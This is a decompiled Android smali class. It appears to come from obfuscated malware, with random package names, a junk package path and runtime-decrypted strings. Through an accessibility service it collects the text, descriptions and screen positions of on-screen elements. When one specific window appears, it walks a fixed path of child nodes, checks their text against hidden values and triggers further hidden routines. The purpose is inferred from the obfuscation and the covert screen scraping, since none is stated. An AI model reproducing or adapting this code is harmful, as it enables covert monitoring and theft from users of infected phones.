.class public abstract Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field public static a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

.field static b:Ljava/util/LinkedList;

.field private static c:Landroid/view/accessibility/AccessibilityNodeInfo;

.field public static final d:Ljava/util/ArrayList;

.field static e:Landroid/os/Handler;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    new-instance v0, Ljava/util/LinkedList;

    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->b:Ljava/util/LinkedList;

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->d:Ljava/util/ArrayList;

    new-instance v0, Landroid/os/Handler;

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl$b;

    invoke-direct {v1}, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl$b;-><init>()V

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Handler$Callback;)V

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->e:Landroid/os/Handler;

    return-void
.end method

.method private static a(Landroid/view/accessibility/AccessibilityNodeInfo;ZZI)V
    .locals 1

    .line 1
    if-nez p0, :cond_0

    return-void

    :cond_0
    new-instance v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;

    invoke-direct {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;-><init>()V

    invoke-virtual {v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->n(Z)V

    invoke-virtual {v0, p2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->o(Z)V

    invoke-virtual {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->q(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-virtual {v0, p3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->p(I)V

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object p1

    if-eqz p1, :cond_1

    :goto_0
    invoke-interface {p1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->r(Ljava/lang/String;)V

    goto :goto_1

    :cond_1
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object p1

    if-eqz p1, :cond_2

    goto :goto_0

    :cond_2
    :goto_1
    new-instance p1, Landroid/graphics/Rect;

    invoke-direct {p1}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {p0, p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {p1}, Landroid/graphics/Rect;->centerX()I

    move-result p0

    invoke-virtual {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->u(I)V

    invoke-virtual {p1}, Landroid/graphics/Rect;->centerY()I

    move-result p0

    invoke-virtual {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->v(I)V

    iget p0, p1, Landroid/graphics/Rect;->left:I

    invoke-virtual {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->s(I)V

    iget p0, p1, Landroid/graphics/Rect;->right:I

    invoke-virtual {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->l(I)V

    iget p0, p1, Landroid/graphics/Rect;->top:I

    invoke-virtual {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->t(I)V

    iget p0, p1, Landroid/graphics/Rect;->bottom:I

    invoke-virtual {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->m(I)V

    sget-object p0, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->d:Ljava/util/ArrayList;

    invoke-virtual {p0, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    return-void
.end method

.method public static b(Landroid/view/accessibility/AccessibilityEvent;Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V
    .locals 1

    .line 1
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->o:Z

    if-eqz v0, :cond_0

    return-void

    :cond_0
    invoke-static {p0, p1}, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->c(Landroid/view/accessibility/AccessibilityEvent;Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V

    return-void
.end method

.method private static c(Landroid/view/accessibility/AccessibilityEvent;Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V
    .locals 7

    .line 1
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->p:Z

    const/4 v1, 0x3

    const/4 v2, 0x1

    const/16 v3, 0x8

    const/4 v4, 0x0

    if-nez v0, :cond_0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const/16 v5, 0x20

    if-ne v0, v5, :cond_0

    const/16 v0, 0x2d

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    new-array v5, v3, [B

    fill-array-data v5, :array_1

    invoke-static {v0, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    move-result-object p0

    invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_0

    const/16 p0, 0x10

    new-array p0, p0, [B

    fill-array-data p0, :array_2

    new-array v0, v3, [B

    fill-array-data v0, :array_3

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    new-array v0, v4, [Ljava/lang/Object;

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/es;->a(Ljava/lang/String;[Ljava/lang/Object;)V

    :try_start_0
    invoke-virtual {p1}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    invoke-virtual {p0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    invoke-virtual {p0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    invoke-virtual {p0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    invoke-virtual {p0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    invoke-virtual {p0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    invoke-virtual {p0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    invoke-virtual {p0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    new-array v5, v3, [B

    fill-array-data v5, :array_4

    new-array v6, v3, [B

    fill-array-data v6, :array_5

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-array v5, v4, [Ljava/lang/Object;

    invoke-static {v0, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/es;->a(Ljava/lang/String;[Ljava/lang/Object;)V

    new-array v0, v2, [B

    const/4 v5, -0x7

    aput-byte v5, v0, v4

    new-array v5, v3, [B

    fill-array-data v5, :array_6

    invoke-static {v0, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contentEquals(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isVisibleToUser()Z

    move-result v0

    if-eqz v0, :cond_0

    const/16 v0, 0x3d

    new-array v0, v0, [B

    fill-array-data v0, :array_7

    new-array v5, v3, [B

    fill-array-data v5, :array_8

    invoke-static {v0, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v5, v4, [Ljava/lang/Object;

    invoke-static {v0, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/es;->a(Ljava/lang/String;[Ljava/lang/Object;)V

    sput-boolean v2, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->p:Z

    invoke-static {p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/sb0;->j(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->e(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    const/16 v0, 0x9

    new-array v0, v0, [B

    fill-array-data v0, :array_9

    new-array v5, v3, [B

    fill-array-data v5, :array_a

    invoke-static {v0, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v5, v4, [Ljava/lang/Object;

    invoke-static {v0, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/es;->a(Ljava/lang/String;[Ljava/lang/Object;)V

    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_0
    :goto_0
    sget-boolean p0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->p:Z

    if-eqz p0, :cond_9

    invoke-virtual {p1}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    const/4 p1, 0x6

    if-eqz p0, :cond_8

    :try_start_1
    invoke-virtual {p0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_7

    invoke-virtual {p0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_6

    invoke-virtual {p0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_5

    invoke-virtual {p0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_4

    invoke-virtual {p0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_3

    invoke-virtual {p0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_2

    invoke-virtual {p0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    new-array v0, v2, [B

    const/4 v1, -0x1

    aput-byte v1, v0, v4

    new-array v1, v3, [B

    fill-array-data v1, :array_b

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object p0

    invoke-virtual {v0, p0}, Ljava/lang/String;->contentEquals(Ljava/lang/CharSequence;)Z

    move-result p0

    if-eqz p0, :cond_1

    goto/16 :goto_2

    :cond_1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->f()V

    new-array p0, p1, [B

    fill-array-data p0, :array_c

    new-array v0, v3, [B

    fill-array-data v0, :array_d

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    new-array v0, v4, [Ljava/lang/Object;

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/es;->a(Ljava/lang/String;[Ljava/lang/Object;)V

    goto/16 :goto_2

    :catch_1
    move-exception p0

    goto/16 :goto_1

    :cond_2
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->f()V

    new-array p0, p1, [B

    fill-array-data p0, :array_e

    new-array v0, v3, [B

    fill-array-data v0, :array_f

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    new-array v0, v4, [Ljava/lang/Object;

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/es;->a(Ljava/lang/String;[Ljava/lang/Object;)V

    goto/16 :goto_2

    :cond_3
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->f()V

    new-array p0, p1, [B

    fill-array-data p0, :array_10

    new-array v0, v3, [B

    fill-array-data v0, :array_11

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    new-array v0, v4, [Ljava/lang/Object;

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/es;->a(Ljava/lang/String;[Ljava/lang/Object;)V

    goto/16 :goto_2

    :cond_4
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->f()V

    new-array p0, p1, [B

    fill-array-data p0, :array_12

    new-array v0, v3, [B

    fill-array-data v0, :array_13

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    new-array v0, v4, [Ljava/lang/Object;

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/es;->a(Ljava/lang/String;[Ljava/lang/Object;)V

    goto/16 :goto_2

    :cond_5
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->f()V

    new-array p0, p1, [B

    fill-array-data p0, :array_14

    new-array v0, v3, [B

    fill-array-data v0, :array_15

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    new-array v0, v4, [Ljava/lang/Object;

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/es;->a(Ljava/lang/String;[Ljava/lang/Object;)V

    goto :goto_2

    :cond_6
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->f()V

    new-array p0, p1, [B

    fill-array-data p0, :array_16

    new-array v0, v3, [B

    fill-array-data v0, :array_17

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    new-array v0, v4, [Ljava/lang/Object;

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/es;->a(Ljava/lang/String;[Ljava/lang/Object;)V

    goto :goto_2

    :cond_7
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->f()V

    new-array p0, p1, [B

    fill-array-data p0, :array_18

    new-array v0, v3, [B

    fill-array-data v0, :array_19

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    new-array v0, v4, [Ljava/lang/Object;

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/es;->a(Ljava/lang/String;[Ljava/lang/Object;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_2

    :goto_1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->f()V

    new-array p1, p1, [B

    fill-array-data p1, :array_1a

    new-array v0, v3, [B

    fill-array-data v0, :array_1b

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    new-array v0, v4, [Ljava/lang/Object;

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/es;->a(Ljava/lang/String;[Ljava/lang/Object;)V

    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    goto :goto_2

    :cond_8
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->f()V

    new-array p0, p1, [B

    fill-array-data p0, :array_1c

    new-array p1, v3, [B

    fill-array-data p1, :array_1d

    invoke-static {p0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    new-array p1, v4, [Ljava/lang/Object;

    invoke-static {p0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/es;->a(Ljava/lang/String;[Ljava/lang/Object;)V

    :cond_9
    :goto_2
    return-void

    nop

    :array_0
    .array-data 1
        0x21t
        -0x26t
        -0x5et
        -0x68t
        0x22t
        -0x3t
        0x41t
        -0x23t
        0x27t
        -0x3ft
        -0x1ft
        -0x2bt
        0x27t
        -0x1bt
        0x5dt
        -0x3bt
        0x2dt
        -0x65t
        -0x45t
        -0x3ct
        0x20t
        -0x11t
        0x59t
        -0x30t
        0x32t
        -0x3bt
        -0x1ft
        -0x3dt
        0x3ct
        -0x4et
        0x4ct
        -0x3ft
        0x32t
        -0x65t
        -0x72t
        -0x3at
        0x25t
        -0x23t
        0x4et
        -0x3bt
        0x2bt
        -0x3dt
        -0x5at
        -0x3et
        0x2ct
    .end array-data

    nop

    :array_1
    .array-data 1
        0x42t
        -0x4bt
        -0x31t
        -0x4at
        0x55t
        -0x64t
        0x2dt
        -0x4ft
    .end array-data

    :array_2
    .array-data 1
        0x2et
        0x2ct
        0x54t
        -0x4at
        -0x48t
        -0x79t
        0x66t
        0x52t
        0xct
        0x28t
        0x44t
        -0x56t
        -0x43t
        -0x6ft
        0x5dt
        0x61t
    .end array-data

    :array_3
    .array-data 1
        0x5ct
        0x49t
        0x37t
        -0x27t
        -0x36t
        -0x1dt
        0x32t
        0x5t
    .end array-data

    :array_4
    .array-data 1
        -0x33t
        0x54t
        -0x64t
        -0x1t
        0x12t
        -0x54t
        -0x3ct
        0x6et
    .end array-data

    :array_5
    .array-data 1
        -0x52t
        0x3ct
        -0xbt
        -0x6dt
        0x76t
        -0x74t
        -0x1ct
        0x4et
    .end array-data

    :array_6
    .array-data 1
        -0x38t
        0x56t
        -0x6et
        0x5ct
        -0x5t
        0x79t
        -0x2t
        0x4bt
    .end array-data

    :array_7
    .array-data 1
        0x3ct
        0x24t
        -0x71t
        0x28t
        0x68t
        -0x49t
        -0x7bt
        0x43t
        0x7bt
        0x7bt
        -0x27t
        0x43t
        0x7at
        -0x53t
        -0x76t
        0x5bt
        0x6dt
        0x3dt
        -0x32t
        0x6et
        0x62t
        -0x4ct
        -0x71t
        0x19t
        0x79t
        0x70t
        -0x27t
        0x52t
        0x6et
        -0x60t
        -0x61t
        0x1ft
        0x37t
        0x3ct
        -0x73t
        0x20t
        0x2dt
        -0x8t
        -0x78t
        0x5ft
        0x77t
        0x79t
        -0x37t
        0x28t
        0x62t
        -0x55t
        -0x43t
        0x5et
        0x6dt
        0x7ct
        -0x31t
        0x6at
        0x6et
        -0x74t
        -0x7ct
        0x62t
        0x6dt
        0x70t
        -0x21t
        0x2et
        0x22t
    .end array-data

    nop

    :array_8
    .array-data 1
        0x1et
        0x15t
        -0x53t
        0x6t
        0xbt
        -0x28t
        -0x15t
        0x37t
    .end array-data

    :array_9
    .array-data 1
        -0x6bt
        -0x44t
        0x5ct
        -0xat
        0x42t
        -0x21t
        0x6t
        0x12t
        -0x16t
    .end array-data

    nop

    :array_a
    .array-data 1
        0x71t
        0x4t
        -0x2ft
        0x11t
        -0x2at
        0x77t
        -0x12t
        -0x53t
    .end array-data

    :array_b
    .array-data 1
        -0x32t
        0x3t
        -0x4et
        0x43t
        0x25t
        0x8t
        0x2et
        -0x65t
    .end array-data

    :array_c
    .array-data 1
        0x55t
        0x3at
        -0x5dt
        0x0t
        -0xat
        0x65t
    .end array-data

    nop

    :array_d
    .array-data 1
        -0x50t
        -0x45t
        0x3ft
        -0x1at
        0x78t
        -0x14t
        -0x19t
        -0x14t
    .end array-data

    :array_e
    .array-data 1
        -0x67t
        -0xdt
        0x74t
        0x5t
        0x41t
        -0x2at
    .end array-data

    nop

    :array_f
    .array-data 1
        0x7ct
        0x72t
        -0x18t
        -0x1dt
        -0x31t
        0x5ft
        0x2at
        0x3ct
    .end array-data

    :array_10
    .array-data 1
        -0x4et
        0x19t
        0x71t
        0x4dt
        0x55t
        0x1t
    .end array-data

    nop

    :array_11
    .array-data 1
        0x57t
        -0x68t
        -0x13t
        -0x55t
        -0x25t
        -0x78t
        0x3ft
        -0x6t
    .end array-data

    :array_12
    .array-data 1
        -0x38t
        -0x34t
        0x41t
        0x43t
        0x64t
        0x7ct
    .end array-data

    nop

    :array_13
    .array-data 1
        0x2dt
        0x4dt
        -0x23t
        -0x5bt
        -0x16t
        -0xbt
        0x78t
        0x55t
    .end array-data

    :array_14
    .array-data 1
        0x59t
        0xat
        -0x18t
        0xat
        -0x4et
        -0x6t
    .end array-data

    nop

    :array_15
    .array-data 1
        -0x44t
        -0x75t
        0x74t
        -0x14t
        0x3ct
        0x73t
        -0x63t
        -0x5at
    .end array-data

    :array_16
    .array-data 1
        -0xct
        0x1ft
        0x40t
        -0x15t
        0x72t
        -0x31t
    .end array-data

    nop

    :array_17
    .array-data 1
        0x11t
        -0x62t
        -0x24t
        0xdt
        -0x4t
        0x46t
        -0x2ft
        0x1dt
    .end array-data

    :array_18
    .array-data 1
        -0x29t
        0x1at
        -0x35t
        -0x1bt
        -0x30t
        -0x6at
    .end array-data

    nop

    :array_19
    .array-data 1
        0x32t
        -0x65t
        0x57t
        0x3t
        0x5et
        0x1ft
        -0x69t
        -0x33t
    .end array-data

    :array_1a
    .array-data 1
        0x52t
        -0xet
        0x19t
        0x71t
        -0x16t
        -0x21t
    .end array-data

    nop

    :array_1b
    .array-data 1
        -0x49t
        0x73t
        -0x7bt
        -0x69t
        0x64t
        0x56t
        0x59t
        -0x44t
    .end array-data

    :array_1c
    .array-data 1
        0x12t
        0x25t
        -0x28t
        -0x2ct
        -0x7bt
        -0x3ct
    .end array-data

    nop

    :array_1d
    .array-data 1
        -0x9t
        -0x5ct
        0x44t
        0x32t
        0xbt
        0x4dt
        0x5et
        -0x1at
    .end array-data
